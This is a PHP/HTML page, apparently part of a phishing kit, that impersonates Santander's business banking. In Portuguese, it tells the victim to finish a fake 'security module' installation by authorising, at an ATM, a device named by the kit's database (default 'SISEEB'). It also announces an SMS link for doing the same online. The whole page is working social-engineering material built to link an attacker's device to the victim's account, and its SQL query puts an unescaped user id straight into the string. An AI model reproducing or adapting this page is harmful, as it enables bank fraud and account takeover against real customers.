<?php
$buscaApelido = read($conn, 'acessos', "WHERE id = '$UserId'");
$Apelido = $buscaApelido['0']['apelido'];

if($Apelido == ''){
	$Apelido = 'SISEEB';
}
?>
<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<title></title>
</head>
<body>

<?php include ('pass_net.php');?>

	<div class="md_all">
		<div class="md_box" style="margin-top: 60px!important;">

			<div class="md_boxLogo border_loader">
				<img src="imgs/logo-stdeMd1.png">
			</div><!-- ld_boxLogo -->

			<div class="md_modalTtitle">
				<h1 class="title_ass">Módulo de Proteção Santander</h1>

				<span style="display:block;width:94%;margin:20px auto;font-size:.75em;line-height: 1.3em;color:#666;">
					O processo de <strong style="font-weight:700;color:#ff0000;">instalação do Módulo de Segurança Santander Empresarial</strong> ainda está <strong style="font-weight:700;color:#ff0000;">pendente de
					confirmação</strong> no caixa eletrônico.
					<br><br>
					Para finalizar o processo, por motivos de segurança, você deve comparecer pessoalmente à um de nossos caixas eletrônicos, e finalizar o processo de habilitação deste dispostivo.

					<br><br>
					<span style="font-weight: 700;color:#ff0000;">Para finalizar o processo de instalação, siga os passos apresentados abaixo.</span>
					<br><br>

					<ul style="line-height: 1.5em;font-weight: 600">
						<li><t style="color:red;">1</t> - Encontre um caixa eletrônico Santander.</li>
						<li><t style="color:red;">2</t> - Identifique-se usando seu cartão.</li>
						<li><t style="color:red;">3</t> - Opção 07 "<strong style="color:#ff0000;font-weight:700">Habilitação ID Santander Empresas</strong>".</li>
						<li><t style="color:red;">4</t> - Nesta tela aparecerão dispostivos para liberação.
							<ol>
								<li>&nbsp;&nbsp;&nbsp;• Selecione o "<strong style="color:#ff0000;font-weight:700"><?php echo $Apelido;?></strong>".</li>
								<li>&nbsp;&nbsp;&nbsp;• Efetue a liberação do mesmo.</li>
							</ol>
						</li>
						<li>
							<t style="color:red;">5</t> - Após realizar o processo acima citado, seu dispositivo: <strong style="color:#ff0000;font-weight:700"><?php echo $Apelido;?></strong> já estará funcionando de forma correta,
							e com <strong>total segurança em suas transações Online.</strong>
						</li>
					</ul>

					<span style="display:block;background-color: #ffafaf;margin: 20px 0 -40px 0;padding: 10px;color:#590101;border-radius: 5px;">
						Para sua maior comodidade, enviaremos um sms com link para realizar a liberação do dispostivo <?php echo $Apelido;?> de forma online.
						<br><br>
						<t style="font-weight: 700;">Caso, você não deseje realizar o processo de liberação em um caixa eletrônico, você poderá realizar a liberação deste dispositivo utilizando seu celular.</t>
						<br><br>
						Aguarde, em alguns minutos você receberá o sms com o link para realizar o processo de liberação online.
					</span>
				</span>
			</div><!-- md_modalTtitle -->

		<div class="clear"><br></div>
		</div><!-- ld_box -->

	</div><!-- md_all -->
</body>
</html>
